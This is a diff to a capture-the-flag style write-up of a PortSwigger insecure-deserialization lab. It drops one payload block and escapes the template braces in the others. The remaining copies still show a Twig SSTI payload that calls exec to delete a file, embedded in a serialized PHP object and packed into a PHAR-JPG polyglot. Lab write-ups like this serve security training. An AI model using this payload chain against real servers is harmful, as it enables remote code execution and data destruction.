@@ -153,11 +153,6 @@ Armed with above information, we can **exploit SSTI (Server-Side Template Inject
 
 ![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113144922.png)
 
-**Payload:**
-```php
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
-```
-
 - PHAR:
 
 **Now we have a SSTI payload, we can build a PHP payload:**
@@ -169,7 +164,7 @@ $object = new CustomTemplate;
 $blog = new Blog;
 
 $blog->user = 'any_user_you_want';
-$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
+$blog->desc = '\{\{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("rm /home/carlos/morale.txt")\}\}';
 
 $object->template_file_path = $blog;
 ```
@@ -229,7 +224,7 @@ class Blog {}
 $object = new CustomTemplate;
 $blog = new Blog;
 $blog->user = 'any_user_you_want';
-$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
+$blog->desc = '\{\{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("rm /home/carlos/morale.txt")\}\}';
 $object->template_file_path = $blog;
 
 
@@ -262,7 +257,7 @@ file_put_contents($outfile, generate_base_phar($payload, $prefix));
 ```shell
 ┌[root♥siunam]-(/opt/phar-jpg-polyglot)-[2023.01.13|15:23:56]-[git://master ✗]
 └> php -c php.ini phar_jpg_polyglot.php
-string(229) "O:14:"CustomTemplate":1:{s:18:"template_file_path";O:4:"Blog":2:{s:4:"user";s:17:"any_user_you_want";s:4:"desc";s:106:"{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}";}}"
+string(229) "O:14:"CustomTemplate":1:{s:18:"template_file_path";O:4:"Blog":2:{s:4:"user";s:17:"any_user_you_want";s:4:"desc";s:106:"\{\{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("rm /home/carlos/morale.txt")\}\}";}}"
 ┌[root♥siunam]-(/opt/phar-jpg-polyglot)-[2023.01.13|15:23:58]-[git://master ✗]
 └> ls -lah out.jpg     
 -rw-r--r-- 1 root root 132K Jan 13 15:23 out.jpg
